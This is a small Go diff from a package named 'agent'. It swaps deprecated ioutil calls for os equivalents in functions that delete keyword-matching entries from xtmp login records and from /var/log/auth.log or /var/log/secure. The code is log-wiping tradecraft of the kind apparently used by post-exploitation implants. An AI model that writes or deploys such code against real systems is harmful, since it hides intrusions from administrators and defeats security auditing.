@@ -5,7 +5,6 @@ package agent
 
 import (
 	"fmt"
-	"io/ioutil"
 	"os"
 	"strings"
 
@@ -30,7 +29,7 @@ func deleteXtmpEntry(keyword string) (err error) {
 			return fmt.Errorf("Failed to open xtmp: %v", err)
 		}
 		defer xtmpf.Close()
-		xmtpData, err := ioutil.ReadFile(path)
+		xmtpData, err := os.ReadFile(path)
 		if err != nil {
 			return fmt.Errorf("Failed to read xtmp: %v", err)
 		}
@@ -86,10 +85,10 @@ func deleteXtmpEntry(keyword string) (err error) {
 // deleteAuthEntry clean up /var/log/auth or /var/log/secure
 func deleteAuthEntry(keyword string) (err error) {
 	path := "/var/log/auth.log"
-	logData, err := ioutil.ReadFile(path)
+	logData, err := os.ReadFile(path)
 	if err != nil {
 		path = "/var/log/secure"
-		logData, err = ioutil.ReadFile(path)
+		logData, err = os.ReadFile(path)
 		if err != nil {
 			return fmt.Errorf("No auth log found: %v", err)
 		}
@@ -101,5 +100,5 @@ func deleteAuthEntry(keyword string) (err error) {
 			new_content += line + "\n"
 		}
 	}
-	return ioutil.WriteFile(path, []byte(new_content), 0644)
+	return os.WriteFile(path, []byte(new_content), 0644)
 }
